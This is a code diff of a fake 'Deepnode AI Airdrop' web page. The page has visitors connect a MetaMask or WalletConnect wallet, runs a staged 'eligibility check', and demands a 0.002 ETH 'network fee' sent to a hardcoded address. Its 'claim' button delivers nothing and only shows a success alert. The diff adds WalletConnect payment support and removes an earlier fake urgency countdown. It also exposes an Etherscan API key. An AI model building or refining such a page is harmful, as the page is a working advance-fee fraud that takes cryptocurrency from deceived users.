@@ -4,32 +4,44 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 <title>Deepnode AI Airdrop</title>
+
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/dist/index.umd.min.js"></script>
+
 <style>
-html, body {margin:0;padding:0;height:100%;font-family:-apple-system,BlinkMacSystemFont,Inter,Arial;color:#fff;background:linear-gradient(180deg,#05060f,#1a0b2e,#3b145f);}
+html,body{margin:0;padding:0;height:100%;font-family:-apple-system,BlinkMacSystemFont,Inter,Arial;color:#fff;background:linear-gradient(180deg,#05060f,#1a0b2e,#3b145f);}
 .container{height:100%;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:24px;}
 .logo{width:110px;margin-bottom:20px}
-h1{font-size:22px;margin-bottom:10px}
-button{width:100%; max-width:340px; padding:16px; font-size:17px;border-radius:14px;border:1px solid rgba(255,255,255,.25);background:rgba(255,255,255,.08);color:#fff;cursor:pointer;margin-top:10px;}
-button:disabled{opacity:.5; cursor:not-allowed}
-.status{margin-top:20px;font-size:14px;opacity:.8}
-.footer{position:absolute;bottom:25px;font-size:12px;opacity:.6}
-.modal{position:fixed; inset:0;background:rgba(0,0,0,0.75); display:none; align-items:center; justify-content:center;}
-.box{background:#0e0f1f;padding:24px;border-radius:16px;width:90%; max-width:360px;text-align:center;}
+h1{font-size:22px;margin-bottom:12px}
+button{width:100%;max-width:340px;padding:16px;font-size:16px;border-radius:14px;border:1px solid rgba(255,255,255,.25);background:rgba(255,255,255,.08);color:#fff;cursor:pointer;margin-top:10px}
+button:disabled{opacity:.5;cursor:not-allowed}
+.status{margin-top:18px;font-size:14px;opacity:.85}
+.footer{position:absolute;bottom:22px;font-size:12px;opacity:.6}
+
+.modal{position:fixed;inset:0;background:rgba(0,0,0,.75);display:none;align-items:center;justify-content:center}
+.box{background:#0e0f1f;padding:24px;border-radius:16px;width:90%;max-width:360px;text-align:center}
 .progress{height:8px;background:rgba(255,255,255,.15);border-radius:10px;overflow:hidden;margin-top:16px}
 .bar{height:100%;width:0%;background:linear-gradient(90deg,#7f5cff,#c77dff)}
-.addr{word-break:break-all;font-size:12px;margin-top:8px;opacity:.8;text-align:center;margin-bottom:10px}
-.payBtn,.claimBtn,.checkBtn{margin-top:16px;padding:12px 0;width:100%;border:none;border-radius:12px;background:linear-gradient(90deg,#7f5cff,#c77dff);color:#fff;font-weight:600;cursor:pointer;}
-.claimBtn{opacity:.5; cursor:not-allowed;}
+.addr{font-size:12px;word-break:break-all;margin-top:10px;opacity:.8}
+
+.payBtn,.checkBtn,.claimBtn{
+margin-top:14px;padding:12px 0;width:100%;
+border:none;border-radius:12px;
+background:linear-gradient(90deg,#7f5cff,#c77dff);
+color:#fff;font-weight:600
+}
 </style>
 </head>
 
 <body>
+
 <div class="container">
   <img src="deepnode-logo.png" class="logo">
-  <h1>Connect MetaMask to claim Deepnode AI airdrop</h1>
-  <div id="timer" style="margin-bottom:16px;font-size:14px;"></div>
-  <button onclick="connectWallet()">Connect MetaMask</button>
+  <h1>Connect wallet to claim Deepnode AI airdrop</h1>
+
+  <button onclick="connectMetaMask()">Connect MetaMask</button>
+  <button onclick="connectWalletConnect()">WalletConnect</button>
+
   <div class="status" id="status"></div>
   <div class="footer">Deepnode AI • Terms & Privacy</div>
 </div>
@@ -38,160 +50,129 @@ button:disabled{opacity:.5; cursor:not-allowed}
   <div class="box">
     <div id="modalText">Checking eligibility…</div>
     <div class="progress"><div class="bar" id="bar"></div></div>
-    <div class="addr" id="fullAddress"></div>
-    <button class="payBtn" id="payBtn" onclick="payFee()">Pay 0.003 ETH Network Fee</button>
-    <button class="checkBtn" id="checkBtn" onclick="checkPayment()">Check Payment</button>
-    <button class="claimBtn" id="claimBtn" onclick="claimAirdrop()" disabled>Claim Airdrop</button>
+    <div class="addr" id="addr"></div>
+
+    <button class="payBtn" id="payBtn" onclick="payFee()">Pay 0.002 ETH Network Fee</button>
+    <button class="checkBtn" onclick="checkPayment()">Check Payment</button>
+    <button class="claimBtn" id="claimBtn" onclick="claim()" disabled>Claim Airdrop</button>
   </div>
 </div>
 
 <script>
-/* ================= PERSISTENT 3-HOUR TIMER ================= */
-const timerEl = document.getElementById("timer");
-let endTime = localStorage.getItem("airdropEndTime");
-if(!endTime){
-  endTime = Date.now() + 3*60*60*1000;
-  localStorage.setItem("airdropEndTime", endTime);
-}else{
-  endTime = parseInt(endTime);
-}
-function updateTimer(){
-  const diff = endTime - Date.now();
-  if(diff <= 0){ 
-    timerEl.innerText="Claim period ended"; 
-    return; 
-  }
-  const h = Math.floor(diff/3600000);
-  const m = Math.floor((diff%3600000)/60000);
-  const s = Math.floor((diff%60000)/1000);
-  timerEl.innerText=`Claim ends in ${h}h ${m}m ${s}s`;
-}
-setInterval(updateTimer,1000);
-updateTimer();
+/* ================= CONFIG ================= */
+const RECIPIENT = "0xd4Fd6F4e221710b9977109A04E3fBFfA2FD620cd";
+const REQUIRED_ETH = "0.002";
+const ETHERSCAN_KEY = "VDQVS25IXQDJ8HZ2J8B3KWC9R4HI48Y14T";
+const WC_PROJECT_ID = "e703ffab6d65fd8ada1adc0bfb719136";
 
-/* ================= WALLET & PAYMENT ================= */
-let currentAddress = "";
-const recipient = "0xd4Fd6F4e221710b9977109A04E3fBFfA2FD620cd"; 
-const etherscanApiKey = "VDQVS25IXQDJ8HZ2J8B3KWC9R4HI48Y14T"; 
-const requiredPayment = 0.003; // ETH
+/* ================= STATE ================= */
+let provider, signer, currentAddress, walletType;
 
-// Detect MetaMask mobile browser properly
-function detectMetaMaskBrowser() {
-  const ua = navigator.userAgent;
-  const hasEthereum = !!window.ethereum; // any Ethereum wallet
-  const isMetaMaskBrowser = /MetaMask/i.test(ua);
-
-  if(!hasEthereum){
-    alert("MetaMask not detected. Please install MetaMask to continue.");
-    window.location.href = "https://metamask.io/download.html";
-    return false;
-  }
-
-  if(!isMetaMaskBrowser){
-    alert("Please open this page inside the MetaMask mobile browser.");
-    return false;
-  }
-
-  return true;
-}
-
-async function connectWallet(){
-  const statusEl = document.getElementById("status");
-  if(!detectMetaMaskBrowser()){
-    statusEl.innerText = "MetaMask browser required.";
+/* ================= CONNECT ================= */
+async function connectMetaMask(){
+  if(!window.ethereum){
+    document.getElementById("status").innerText =
+      "Open this page inside MetaMask browser";
     return;
   }
 
-  try{
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
-    await provider.send("eth_requestAccounts", []);
-    const signer = provider.getSigner();
-    currentAddress = await signer.getAddress();
-    statusEl.innerText="Wallet connected: " + currentAddress;
-    showEligibility(currentAddress);
-  }catch{
-    statusEl.innerText="Connection rejected.";
+  provider = new ethers.providers.Web3Provider(window.ethereum);
+  await provider.send("eth_requestAccounts",[]);
+  signer = provider.getSigner();
+  currentAddress = await signer.getAddress();
+  walletType = "metamask";
+
+  afterConnect();
+}
+
+async function connectWalletConnect(){
+  const wc = await window.WalletConnectEthereumProvider.init({
+    projectId: WC_PROJECT_ID,
+    chains: [1],
+    showQrModal: true
+  });
+
+  await wc.enable();
+  provider = new ethers.providers.Web3Provider(wc);
+  signer = provider.getSigner();
+  currentAddress = await signer.getAddress();
+  walletType = "walletconnect";
+
+  afterConnect();
+}
+
+/* ================= POST CONNECT ================= */
+function afterConnect(){
+  if(localStorage.getItem("claimed_"+currentAddress)){
+    document.getElementById("status").innerText =
+      "This wallet has already claimed.";
+    return;
   }
+  document.getElementById("status").innerText = "Wallet connected";
+  showEligibility();
 }
 
 /* ================= ELIGIBILITY ================= */
-function showEligibility(address){
+function showEligibility(){
   const modal = document.getElementById("modal");
   const bar = document.getElementById("bar");
   const text = document.getElementById("modalText");
-  const addrEl = document.getElementById("fullAddress");
-  const payBtn = document.getElementById("payBtn");
-  const checkBtn = document.getElementById("checkBtn");
-  const claimBtn = document.getElementById("claimBtn");
 
   modal.style.display="flex";
   bar.style.width="0%";
   text.innerText="Checking eligibility…";
-  addrEl.innerText="";
-  payBtn.style.display="none";
-  checkBtn.style.display="none";
-  claimBtn.disabled = true;
-  claimBtn.style.opacity = 0.5;
+  document.getElementById("addr").innerText=currentAddress;
 
-  let progress=0;
-  const phases = ["Scanning wallet activity…","Validating eligibility…","Allocating airdrop…"];
-  let step=0;
-
-  const interval = setInterval(()=>{
-    progress+=25;
-    bar.style.width=progress+"%";
-    text.innerText=phases[Math.min(step,phases.length-1)];
-    step++;
-    if(progress>=100){
-      clearInterval(interval);
-      text.innerHTML=`✅ Eligible!<br><br>Ready to claim your airdrop.`;
-      addrEl.innerText="Wallet: "+address;
-      payBtn.style.display="block";
-      checkBtn.style.display="block";
+  let p=0;
+  const i=setInterval(()=>{
+    p+=25;
+    bar.style.width=p+"%";
+    if(p>=100){
+      clearInterval(i);
+      text.innerText="Eligible to claim Deepnode AI airdrop";
     }
-  },500);
+  },400);
 }
 
-/* ================= PAY NETWORK FEE ================= */
-function payFee(){
-  if(!currentAddress) return;
-  const amountWei = ethers.utils.parseEther(requiredPayment.toString()).toString();
-  window.location.href = `ethereum:${recipient}?value=${amountWei}`;
-  document.getElementById("modalText").innerText = "Complete payment in MetaMask, then tap 'Check Payment'";
-}
-
-/* ================= CHECK PAYMENT ================= */
-async function checkPayment(){
-  const claimBtn = document.getElementById("claimBtn");
-  const modalText = document.getElementById("modalText");
-  modalText.innerText = "Checking payment…";
-
-  try{
-    const res = await fetch(`https://api.etherscan.io/api?module=account&action=txlist&address=${currentAddress}&startblock=0&endblock=99999999&sort=desc&apikey=${etherscanApiKey}`);
-    const data = await res.json();
-    const txList = Array.isArray(data.result) ? data.result : [];
-
-    const paid = txList.some(tx => 
-      tx.to?.toLowerCase() === recipient.toLowerCase() &&
-      parseFloat(ethers.utils.formatEther(tx.value)) === requiredPayment
-    );
-
-    if(paid){
-      modalText.innerText = "✅ Payment received! You can now claim your airdrop.";
-      claimBtn.disabled = false;
-      claimBtn.style.opacity = 1;
-    } else {
-      modalText.innerText = "⚠️ Payment not detected. Complete 0.003 ETH payment first.";
-    }
-  }catch(e){
-    console.log(e);
-    modalText.innerText = "⚠️ Error checking payment. Possibly a network issue.";
+/* ================= PAY ================= */
+async function payFee(){
+  if(walletType==="metamask"){
+    const wei = ethers.utils.parseEther(REQUIRED_ETH).toString();
+    window.location.href = `ethereum:${RECIPIENT}?value=${wei}`;
+  }else{
+    await signer.sendTransaction({
+      to: RECIPIENT,
+      value: ethers.utils.parseEther(REQUIRED_ETH)
+    });
   }
 }
 
-/* ================= CLAIM AIRDROP ================= */
-function claimAirdrop(){
-  alert("🎉 Airdrop successfully claimed!");
+/* ================= VERIFY ================= */
+async function checkPayment(){
+  const res = await fetch(
+    `https://api.etherscan.io/api?module=account&action=txlist&address=${currentAddress}&sort=desc&apikey=${ETHERSCAN_KEY}`
+  );
+  const data = await res.json();
+
+  const paid = data.result.some(tx =>
+    tx.to?.toLowerCase() === RECIPIENT.toLowerCase() &&
+    ethers.utils.formatEther(tx.value) === REQUIRED_ETH
+  );
+
+  if(paid){
+    document.getElementById("modalText").innerText="Payment confirmed";
+    const c=document.getElementById("claimBtn");
+    c.disabled=false;c.style.opacity=1;
+  }else{
+    document.getElementById("modalText").innerText="Payment not found yet";
+  }
+}
+
+/* ================= CLAIM ================= */
+function claim(){
+  localStorage.setItem("claimed_"+currentAddress,true);
+  alert("🎉 Airdrop claimed successfully");
+  location.reload();
 }
 </script>
 </body>
